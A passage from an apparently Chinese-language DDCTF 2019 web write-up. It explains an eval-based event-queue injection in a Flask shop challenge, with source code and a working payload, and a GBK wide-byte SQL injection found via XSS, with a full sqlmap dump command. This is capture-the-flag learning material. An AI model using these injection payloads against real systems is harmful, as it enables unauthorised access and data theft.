</span></span><span class=line><span class=cl>    <span class=n>html</span> <span class=o>+=</span> <span class=s1>&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>html</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index_handler</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>bool_show_source</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>bool_download_source</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>bool_show_source</span> <span class=o>==</span> <span class=s1>&#39;True&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>        <span class=n>source</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;eventLoop.py&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>html</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>bool_download_source</span> <span class=o>!=</span> <span class=s1>&#39;True&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>html</span> <span class=o>+=</span> <span class=s1>&#39;&lt;a href=&#34;./?action:index;True%23True&#34;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>            <span class=n>html</span> <span class=o>+=</span> <span class=s1>&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>source</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>bool_download_source</span> <span class=o>!=</span> <span class=s1>&#39;True&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>html</span> <span class=o>+=</span> <span class=n>line</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;&amp;&#39;</span><span class=p>,</span><span class=s1>&#39;&amp;amp;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\t</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;&amp;nbsp;&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;&amp;nbsp;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&amp;lt;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;&amp;gt;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;&lt;br /&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>html</span> <span class=o>+=</span> <span class=n>line</span>
</span></span><span class=line><span class=cl>        <span class=n>source</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>bool_download_source</span> <span class=o>==</span> <span class=s1>&#39;True&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>headers</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>            <span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;text/plain&#39;</span>
</span></span><span class=line><span class=cl>            <span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Disposition&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;attachment; filename=serve.py&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Response</span><span class=p>(</span><span class=n>html</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>html</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>trigger_event</span><span class=p>(</span><span class=s1>&#39;action:view;index&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>buy_handler</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>num_items</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>num_items</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>:</span> <span class=k>return</span> <span class=s1>&#39;invalid number(</span><span class=si>{}</span><span class=s1>) of diamonds to buy&lt;br /&gt;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=n>num_items</span> 
</span></span><span class=line><span class=cl>    <span class=n>trigger_event</span><span class=p>([</span><span class=s1>&#39;func:consume_point;</span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>num_items</span><span class=p>),</span> <span class=s1>&#39;action:view;index&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>consume_point_function</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>point_to_consume</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;points&#39;</span><span class=p>]</span> <span class=o>&lt;</span> <span class=n>point_to_consume</span><span class=p>:</span> <span class=k>raise</span> <span class=n>RollBackException</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;points&#39;</span><span class=p>]</span> <span class=o>-=</span> <span class=n>point_to_consume</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show_flag_function</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=c1>#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;You naughty boy! ;) &lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_flag_handler</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>5</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>trigger_event</span><span class=p>(</span><span class=s1>&#39;func:show_flag;&#39;</span> <span class=o>+</span> <span class=n>FLAG</span><span class=p>())</span> <span class=c1># show_flag_function has been disabled, no worries</span>
</span></span><span class=line><span class=cl>    <span class=n>trigger_event</span><span class=p>(</span><span class=s1>&#39;action:view;index&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span> 
</span></span></code></pre></div><p>一个比较简单的 Flask 框架，提供使用 points 购买 diamonds 的功能，然后将操作记录写进<code>session['log']</code> 里面。</p><p>整个代码还是比较简单的，而且漏洞点也相对比较明显。其实每个语言的<code>eval</code>函数都差不多，比如这里 python 的<code>eval</code>函数，类似于 php 中的<code>eval</code>，也可以将<code>eval</code>中的字符串当作代码来处理。</p><p>所以这意味着什么呢？这就意味着可以使用<code>#</code>注释我们不需要的代码。</p><p>举个例子：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>eval</span><span class=p>(</span><span class=s2>&#34;print(1)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>eval</span><span class=p>(</span><span class=s2>&#34;print(1)#do something)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1</span>
</span></span></code></pre></div><p>所以我们就可以利用这个特性，利用题目中的<code>event_handler</code>来执行任意函数。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002577.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002577.jpg loading=lazy></a></figure></p><p>利用<code>#</code>成功绕过了后缀的限制执行了<code>show_flag_function</code>函数。</p><p>虽然可以直接执行<code>getFlag</code>函数，但是这个函数还是有一个限制<code>session['num_items'] >= 5</code>，即使可以直接执行但是因为这个判断也无法绕过。所以这里可以有一些思路，比如找一个可以由<code>int</code>函数转换成负数的数，或者直接打印函数什么。但是两种基本都走不通&mldr;</p><p>CTF 魅力所在可能就是可以让你利用你能利用的一切去创造一些新的途径达到自己目的。</p><p>既然要绕过<code>session['num_items'] >= 5</code>的判断，我们就需要通过<code>buy_handler</code>来增加自己的物品数，然而这个函数里面我们可以看到</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>buy_handler</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>num_items</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>num_items</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>:</span> <span class=k>return</span> <span class=s1>&#39;invalid number(</span><span class=si>{}</span><span class=s1>) of diamonds to buy&lt;br /&gt;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=n>num_items</span> 
</span></span><span class=line><span class=cl>    <span class=n>trigger_event</span><span class=p>([</span><span class=s1>&#39;func:consume_point;</span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>num_items</span><span class=p>),</span> <span class=s1>&#39;action:view;index&#39;</span><span class=p>])</span>
</span></span></code></pre></div><p>最后一行并没有直接调用<code>consume_point_function</code>，而是通过调用<code>trigger_event</code>来调用花费的函数。</p><p>然而我们可以看到<code>trigger_event</code>函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>trigger_event</span><span class=p>(</span><span class=n>event</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;log&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>event</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;log&#39;</span><span class=p>])</span> <span class=o>&gt;</span> <span class=mi>5</span><span class=p>:</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;log&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;log&#39;</span><span class=p>][</span><span class=o>-</span><span class=mi>5</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>type</span><span class=p>(</span><span class=n>event</span><span class=p>)</span> <span class=o>==</span> <span class=nb>type</span><span class=p>([]):</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span> <span class=o>+=</span> <span class=n>event</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>event</span><span class=p>)</span>
</span></span></code></pre></div><p>只不过是用来增加<code>session</code>记录而已，并没有立即去调用<code>consume_point_function</code>，所以如果我们在<code>buy_handler</code>与<code>consume_point_function</code>两个函数之间执行<code>get_Flag</code>函数，就可以先增加自己的<code>item</code>来绕过<code>get_Flag</code>函数对于<code>item</code>的判断，尽管之后会执行<code> consume_point_function</code>函数，但是 Flag 已经被我们打印出来了，所以后面即使会回滚也无关紧要了。</p><p>所以如何构造这个 payload 达到我们在<code>buy_handler</code>之后立即执行<code>get_Flag</code>函数呢。让我们来看看整个代码的逻辑。首先代码会进入<code>entry_point</code>函数，并将<code>querystring</code>传入<code>trigger_event</code>函数，<code>trigger_event</code>将行动记录到<code>session['log']</code>当中，接着执行<code>execute_event_loop</code>函数。</p><p>我们重点来看<code>execute_event_loop</code>这个函数。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute_event_loop</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>valid_event_chars</span> <span class=o>=</span> <span class=nb>set</span><span class=p>(</span><span class=s1>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>event_queue</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>event</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=c1># `event` is something like &#34;action:ACTION;ARGS0#ARGS1#ARGS2......&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>event</span><span class=o>.</span><span class=n>startswith</span><span class=p>((</span><span class=s1>&#39;action:&#39;</span><span class=p>,</span> <span class=s1>&#39;func:&#39;</span><span class=p>)):</span> <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>event</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>c</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>valid_event_chars</span><span class=p>:</span> <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>is_action</span> <span class=o>=</span> <span class=n>event</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;a&#39;</span>
</span></span><span class=line><span class=cl>            <span class=n>action</span> <span class=o>=</span> <span class=n>get_mid_str</span><span class=p>(</span><span class=n>event</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=s1>&#39;;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>args</span> <span class=o>=</span> <span class=n>get_mid_str</span><span class=p>(</span><span class=n>event</span><span class=p>,</span> <span class=n>action</span><span class=o>+</span><span class=s1>&#39;;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;#&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>event_handler</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>action</span> <span class=o>+</span> <span class=p>(</span><span class=s1>&#39;_handler&#39;</span> <span class=k>if</span> <span class=n>is_action</span> <span class=k>else</span> <span class=s1>&#39;_function&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>ret_val</span> <span class=o>=</span> <span class=n>event_handler</span><span class=p>(</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=n>RollBackException</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>resp</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> <span class=n>resp</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>                <span class=n>resp</span> <span class=o>+=</span> <span class=s1>&#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>                <span class=n>resp</span> <span class=o>+=</span> <span class=s1>&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>                <span class=n>session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>prev_session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>session</span><span class=p>[</span><span class=s1>&#39;points&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>prev_session</span><span class=p>[</span><span class=s1>&#39;points&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span><span class=p>,</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>resp</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> <span class=n>resp</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>                <span class=c1>#resp += str(e) # only for debugging</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>ret_val</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>resp</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> <span class=n>resp</span> <span class=o>=</span> <span class=n>ret_val</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span> <span class=n>resp</span> <span class=o>+=</span> <span class=n>ret_val</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>resp</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>or</span> <span class=n>resp</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span> <span class=n>resp</span> <span class=o>=</span> <span class=p>(</span><span class=s1>&#39;404 NOT FOUND&#39;</span><span class=p>,</span> <span class=mi>404</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=o>.</span><span class=n>modified</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>resp</span>
</span></span></code></pre></div><p>这个函数进入循环执行函数的条件为<code>while len(request.event_queue) > 0</code>，而<code>trigger_event</code>函数是可以控制<code>request.event_queue</code>的关键，所以按照我们之前的思路，我们是不是可以利用这个函数来控制我们的执行顺序呢？</p><p>例如我们可以先尝试构造<code>action:trigger_event%23;action:buy;8</code>，我们本地可以通过<code>app.logger.info</code>来查看<code>execute_event_loop</code>循环中的<code>action</code>与<code>args</code>参数，我们可以得到</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005313.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005313.jpg loading=lazy></a></figure></p><p>可以看到执行了<code>but_handler</code>函数，我们注意<code>trigger_event</code>中是可以接受数组的</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=nb>type</span><span class=p>(</span><span class=n>event</span><span class=p>)</span> <span class=o>==</span> <span class=nb>type</span><span class=p>([]):</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span> <span class=o>+=</span> <span class=n>event</span>
</span></span></code></pre></div><p>对于数组的处理，他会挨个加入到<code>request.event_queue</code>，所以我们就可以利用传入数组来控制执行顺序，只要我们传入一个第一个参数为<code>but_handler</code>的函数，第二个参数为<code>get_Flag</code>的函数就可以实现在调用花费函数之前来输出 Flag 了。</p><p>怎么构造数组呢？在<code>execute_event_loop</code>中对于参数的处理可以自己随便测试一下就知道了他是以<code>:;</code>之后的字符串以<code>#</code>为分割来形成数组的。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001621.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001621.jpg loading=lazy></a></figure></p><p>所以这样子我们就成功将<code>get_flag</code>函数优先调用了。接下来就是处理一些细节的事情了，比如调用<code>get_Flag</code>在源代码中是<code>get_flag_handler</code>，所以我们需要传入的参数是<code>action:get_flag</code>，以及 Flag 最后是通过以下函数调用<code>trigger_event</code>把 Flag 输出到<code>session['log']</code>当中的。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_flag_handler</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>5</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>trigger_event</span><span class=p>(</span><span class=s1>&#39;func:show_flag;&#39;</span> <span class=o>+</span> <span class=n>FLAG</span><span class=p>())</span> <span class=c1># show_flag_function has been disabled, no worries</span>
</span></span><span class=line><span class=cl>    <span class=n>trigger_event</span><span class=p>(</span><span class=s1>&#39;action:view;index&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>所以我们的 payload 就是<code>action:trigger_event%23;action:buy;8%23action:get_flag;</code>，再通过p牛的 flask cookie 解密脚本即可得到 flag</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009428.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009428.jpg loading=lazy></a></figure></p><h2 id=web-5-欢迎报名ddctf>Web 5 欢迎报名DDCTF</h2><h3 id=description-4>Description</h3><p>{% colorquote info %}</p><p><a class=link href=http://117.51.147.2/Ze02pQYLf5gGNyMn/ target=_blank rel=noopener>http://117.51.147.2/Ze02pQYLf5gGNyMn/</a></p><p>提示：XSS不是获取cookie
提示2：之后是注入</p><p>{% endcolorquote %}</p><h3 id=hacking-4>Hacking</h3><p>一开始根本打不了…而且还被人用 Beff 搅屎了&mldr;而且严重怀疑这题是中途改题的…很坑</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008967.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008967.jpg loading=lazy></a></figure></p><p>首先题目设置比较简单</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009535.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009535.jpg loading=lazy></a></figure></p><p>测试 XSS ，但是贼坑的误导你，返回了想误导你走入 sql 注入的大坑。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004518.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004518.jpg loading=lazy></a></figure></p><p>我们可以用 xss 拿到 admin.php 的 html 源码</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005558.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005558.jpg loading=lazy></a></figure></p><p>看到源码中一个接口，直接访问提示需要一个 id 的传参，随便输入之后看到响应包</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Thu, 25 Apr 2019 03:06:39 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Apache</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>31</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html;charset=gbk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>List Query API<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>发现<code>Content-Type</code>为<code>charset=gbk</code>，猜测是一个宽字节注入。而且并没有什么过滤，直接开注，可能唯一需要一点 trick 的就是需要用十六进制绕过被转义的单引号了&mldr;</p><p>注出库名</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002153.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002153.jpg loading=lazy></a></figure></p><p>注出表名</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001782.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001782.jpg loading=lazy></a></figure></p><p>注出字段名</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009597.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009597.jpg loading=lazy></a></figure></p><p>拿到 flag</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005221.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005221.jpg loading=lazy></a></figure></p><p>当然也可以用 sqlmap 直接跑。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009838.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009838.jpg loading=lazy></a></figure></p><p>也可以指定使用<code>--tamper unmagicquotes</code>来进行注入</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python sqlmap.py -u <span class=s2>&#34;http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1&#34;</span> --tamper unmagicquotes --hex --level <span class=m>3</span> -D ctfdb -T ctf_fhmHRPL5 --dump
</span></span></code></pre></div><h2 id=web-6-大吉大利今晚吃鸡>Web 6 大吉大利，今晚吃鸡～</h2><h3 id=description-5>Description</h3><p>{% colorquote info %}</p><p><a class=link href=http://117.51.147.155:5050/index.html#/login target=_blank rel=noopener>http://117.51.147.155:5050/index.html#/login</a>
